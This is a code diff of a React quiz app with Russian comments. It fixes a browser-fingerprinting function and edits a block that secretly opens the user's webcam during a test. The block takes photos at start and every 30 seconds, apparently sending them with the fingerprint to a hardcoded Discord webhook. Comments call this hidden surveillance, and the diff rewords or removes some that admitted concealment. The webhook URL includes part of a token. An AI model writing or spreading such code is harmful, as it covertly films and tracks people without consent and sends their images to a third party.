@@ -8,7 +8,7 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1481534100194983958/L1
 async function sha256hex(str){const buf = new TextEncoder().encode(str);const hashBuf = await crypto.subtle.digest('SHA-256', buf);return Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');}
 async function hmacSign(secret, message){const enc = new TextEncoder();const key = await crypto.subtle.importKey("raw", enc.encode(secret), {name:"HMAC", hash:"SHA-256"}, false, ["sign"]);const sig = await crypto.subtle.sign("HMAC", key, enc.encode(message));return Array.from(new Uint8Array(sig)).map(b=>b.toString(16).padStart(2,"0")).join("");}
 function canvasFingerprint(){try{const c=document.createElement('canvas'),ctx=c.getContext('2d');c.width=200;c.height=50;ctx.textBaseline='top';ctx.font="16px Arial";ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('test-λ',2,2);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('test-λ',4,24);return c.toDataURL();}catch(e){return '';}}
-async function computeFingerprint(){const parts=[navigator.userAgent||'',navigator.platform||'',screen.width+'x'+screen.height,navigator.language||'',String(navigator.hardwareConcurrency||''),await sha256hex(parts.join('|'));return await sha256hex(parts.join('|'));}
+async function computeFingerprint(){const parts=[navigator.userAgent||'',navigator.platform||'',screen.width+'x'+screen.height,navigator.language||'',String(navigator.hardwareConcurrency||''),await sha256hex(canvasFingerprint())];return await sha256hex(parts.join('|'));}
 function shuffleArray(arr) { const a=[...arr]; for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }
 
 function useMathJax(contentRef, dependencies = []) {
@@ -240,7 +240,7 @@ function App() {
   const [customQCount, setCustomQCount] = useState(''); 
   const [isAnimating, setIsAnimating] = useState(false);
 
-  // --- SECURITY MONITORING HOOKS ---
+  // --- ДОБАВЛЕНО: ФУНКЦИОНАЛ СЛЕЖКИ И ОТПРАВКИ ФОТО ---
   const captureViolation = async (title, extraFields = []) => {
       const video = document.getElementById('securityCam');
       let formData = new FormData();
@@ -266,7 +266,7 @@ function App() {
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
               const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
               video.srcObject = stream;
-              await new Promise(r => setTimeout(r, 150)); // Минимальный прогрев для скрытности
+              await new Promise(r => setTimeout(r, 150)); 
               
               const canvas = document.createElement('canvas');
               canvas.width = video.videoWidth; 
@@ -290,11 +290,10 @@ function App() {
       } catch(e) {}
   };
 
-  // ТАЙМЕР ДЛЯ СКРЫТЫХ ФОТО (30 СЕК)
+  // Таймер на 30 секунд для фото
   useEffect(() => {
     let intervalId = null;
     if (view === 'test') {
-      // Первый захват через 3 секунды для подтверждения старта
       setTimeout(() => captureViolation("📸 Плановая проверка (мониторинг)"), 3000);
       
       intervalId = setInterval(() => {
@@ -302,8 +301,9 @@ function App() {
       }, 30000);
     }
     return () => { if (intervalId) clearInterval(intervalId); };
-  }, [view]);
+  }, [view, fp]);
 
+  // Отслеживание нарушений
   useEffect(() => {
       if (view !== 'test') return;
 
@@ -331,7 +331,7 @@ function App() {
           window.removeEventListener('keydown', handleKeys);
       };
   }, [view, fp]);
-  // ---------------------------------
+  // --- КОНЕЦ БЛОКА СЛЕЖКИ ---
 
   useEffect(() => { document.body.className = theme; localStorage.setItem('theme', theme); }, [theme]);
 
@@ -409,8 +409,8 @@ function App() {
     setView('timer_setup');
   };
   
+  // ДОБАВЛЕНО: Скрытый запрос доступа к камере при старте
   const launchTestWithTimer = async () => {
-      // СКРЫТЫЙ ЗАПРОС ДОСТУПА ПРИ СТАРТЕ
       try {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true });
           stream.getTracks().forEach(t => t.stop());
@@ -509,7 +509,6 @@ function App() {
     if(wrongQuestionsRaw.length === 0) return; 
 
     // 2. ПЕРЕМЕШИВАЕМ ВАРИАНТЫ ОТВЕТОВ ЗАНОВО
-    // Так как у нас уже есть флаг _isCorrectOriginal внутри объектов вариантов, мы можем спокойно мешать
     const reShuffledQuestions = wrongQuestionsRaw.map(q => {
        const newVars = shuffleArray([...q.variants]);
        const newCorrectIdx = newVars.findIndex(v => v._isCorrectOriginal);
